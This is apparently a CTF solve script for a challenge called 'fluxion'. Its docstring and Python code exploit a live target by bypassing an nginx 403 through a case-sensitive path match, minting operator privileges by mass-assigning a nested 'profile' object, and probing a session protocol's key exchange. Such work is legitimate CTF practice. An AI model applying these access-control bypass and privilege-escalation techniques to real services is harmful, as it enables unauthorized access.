#!/usr/bin/env python3
"""
fluxion, live-build stages that WORK.  Run with CTF_TARGET set.

The deployed build is NOT the handout.  Differences established on 2026-09-05:
  * saveViewPreferences filters __proto__ and constructor, so the handout's
    prototype pollution (stages 4 and 5 of solve/solve.py) is DEAD live.
  * resumeHook additionally demands an armToken from an FCP arming handshake.
  * three extra RPC methods exist: armRun (deprecated stub), enrollDevice and
    controlPlaneStatus, plus describeEnrollment and listApprovers.

Working so far:
  1. nginx 403s /fcp but its location match is case sensitive and express
     routing is not, so POST /FCP reaches the app.  GET /FCP self-documents.
  2. enrollDevice mass-assigns a nested `profile` object straight into the
     signed enrollment document, so
         enrollDevice {"profile": {"tier": "operator", "scopes": ["arm","read"]}}
     mints an OPERATOR enrollment.  Flat "tier" is ignored; nested is not.
  3. HELLO (opcode 1, seq 0, zero session, payload = the enrollment token)
     opens a session: reply opcode 0x81, 4-byte session id, 9-byte payload
     that is an 8-byte challenge plus a 0x01 byte.

Blocked at: KEX (opcode 2, seq 1) wants a MAC payload.  Anything else gives
E_KEX_MAC and destroys the session, so one guess per HELLO.
"""
import base64
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fcp                                                    # noqa: E402
import solve as S                                             # noqa: E402

OPERATOR_PROFILE = {"tier": "operator", "scopes": ["arm", "read", "approve"]}


def enroll(profile=None):
    """-> the enrollDevice result dict, tier honoured through `profile`."""
    return S.rpc("enrollDevice", {"profile": profile or OPERATOR_PROFILE})["result"]


def split(token):
    """-> (raw document string, signature bytes)."""
    b64, sig = token.split(".")
    return (base64.urlsafe_b64decode(b64 + "==").decode(),
            base64.urlsafe_b64decode(sig + "=="))


def hello(token):
    """-> (session_id 4 bytes, challenge 8 bytes, trailing byte) or raises."""
    r = fcp.call(1, fcp.ZERO, token)
    if r.get("op") != 0x81:
        raise RuntimeError("HELLO refused: %r" % r.get("text"))
    return r["session"][2:], r["payload"][:8], r["payload"][8:]


def kex(sid, mac):
    """seq 1.  One shot: a wrong MAC kills the session."""
    return fcp.call(2, struct.pack(">H", 1) + sid, mac)


def tick(sid, seq, payload=b""):
    return fcp.call(4, struct.pack(">H", seq) + sid, payload)


def arm(sid, seq, payload=b""):
    return fcp.call(3, struct.pack(">H", seq) + sid, payload)


if __name__ == "__main__":
    en = enroll()
    print("[+] enrolled tier=%s device=%s" % (en["tier"], en["deviceId"]))
    sid, chal, tail = hello(en["enrollment"])
    print("[+] session=%s challenge=%s tail=%s" % (sid.hex(), chal.hex(), tail.hex()))
    print("[*] kex(zero mac) ->", kex(sid, b"\x00" * 32).get("text"))
